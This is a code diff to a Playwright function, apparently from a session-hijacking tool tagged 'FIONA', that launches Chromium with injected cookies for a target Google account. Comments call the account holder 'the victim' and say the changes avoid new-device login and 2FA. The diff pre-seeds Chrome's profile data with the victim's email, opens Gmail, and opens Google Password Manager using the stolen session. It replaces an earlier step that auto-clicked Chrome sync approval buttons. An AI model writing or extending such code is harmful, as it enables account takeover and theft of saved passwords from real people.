@@ -46,10 +46,50 @@ async function launchProfile({ profileId, cookies, email, userId }) {
   }
   fs.mkdirSync(profileDir, { recursive: true });
 
+  // ── Pre-seed Chrome profile display info ─────────────────────────────────
+  // Write account metadata into Local State BEFORE launch so Chrome
+  // shows the victim's email in the profile icon immediately.
+  // No web sign-in flow, no new-device login, no 2FA challenge.
+  const displayName = email.split('@')[0].replace(/[._]/g, ' ');
+  const localState = {
+    profile: {
+      info_cache: {
+        Default: {
+          active_time: Date.now() / 1000,
+          avatar_icon: 'chrome://theme/IDR_PROFILE_AVATAR_26',
+          gaia_given_name: displayName,
+          gaia_id: '',
+          gaia_name: displayName,
+          hosted_domain: '',
+          is_consented_primary_account: false,
+          is_ephemeral: false,
+          is_using_default_avatar: true,
+          is_using_default_name: false,
+          name: displayName,
+          shortcut_name: displayName,
+          user_name: email,
+        },
+      },
+      last_active_profiles: ['Default'],
+      profiles_created: 1,
+    },
+  };
+  const defaultDir = path.join(profileDir, 'Default');
+  fs.mkdirSync(defaultDir, { recursive: true });
+  fs.writeFileSync(
+    path.join(profileDir, 'Local State'),
+    JSON.stringify(localState, null, 2)
+  );
+
+  // ── Launch Chromium ───────────────────────────────────────────────────────
   const context = await chromium.launchPersistentContext(profileDir, {
     headless: false,
     viewport: { width: 1280, height: 800 },
-    args: ['--no-first-run', '--no-default-browser-check', '--disable-extensions'],
+    args: [
+      '--no-first-run',
+      '--no-default-browser-check',
+      '--disable-background-networking',
+    ],
   });
 
   if (Array.isArray(cookies) && cookies.length > 0) {
@@ -65,41 +105,19 @@ async function launchProfile({ profileId, cookies, email, userId }) {
   const pages = context.pages();
   const gmailTab = pages.length > 0 ? pages[0] : await context.newPage();
 
+  // Tab 1 — Gmail inbox
   await gmailTab.goto('https://mail.google.com', {
     waitUntil: 'domcontentloaded',
     timeout: 30000,
   });
 
-  // Sign Chromium browser profile in — profile icon shows the account,
-  // chrome://password-manager becomes accessible without re-auth
-  const syncTab = await context.newPage();
-  await syncTab.goto(
-    'https://accounts.google.com/signin/chrome/sync?ssp=1&continue=https://myaccount.google.com',
-    { waitUntil: 'domcontentloaded', timeout: 20000 }
-  ).catch((e) => console.warn('[FIONA] Sync note (non-fatal):', e.message));
-
-  // Click the approval button — Google shows "Yes, I'm in" or "Yes" on this page
-  await syncTab.waitForTimeout(2000);
-  for (const sel of [
-    'button:has-text("Yes, I\'m in")',
-    'button:has-text("Yes")',
-    'button:has-text("Continue")',
-    '#yesButton',
-    'div[jsname="Njthtb"]',
-    'input[type="submit"]',
-  ]) {
-    const clicked = await syncTab.click(sel, { timeout: 2000 })
-      .then(() => true)
-      .catch(() => false);
-    if (clicked) {
-      console.log(`[FIONA] Chrome sync approved via: ${sel}`);
-      break;
-    }
-  }
-
-  // Give Chrome time to register the profile sign-in
-  await syncTab.waitForTimeout(6000);
-  await syncTab.close().catch(() => {});
+  // Tab 2 — Google Password Manager via injected GAIA cookies
+  // No new-device login triggered — same session as Gmail
+  const pwTab = await context.newPage();
+  await pwTab.goto('https://passwords.google.com', {
+    waitUntil: 'domcontentloaded',
+    timeout: 30000,
+  });
 
   await gmailTab.bringToFront();
   await gmailTab.waitForTimeout(2000);
@@ -121,11 +139,7 @@ async function launchProfile({ profileId, cookies, email, userId }) {
   context.on('close', () => {
     activeBrowsers.delete(profileId);
     launching.delete(profileId);
-    try {
-      fs.rmSync(profileDir, { recursive: true, force: true });
-    } catch (err) {
-      console.warn(`[FIONA] Cleanup warning (non-fatal): ${err.message}`);
-    }
+    fs.rmSync(profileDir, { recursive: true, force: true });
     console.log(`[FIONA] Browser closed: ${profileId}`);
   });
 
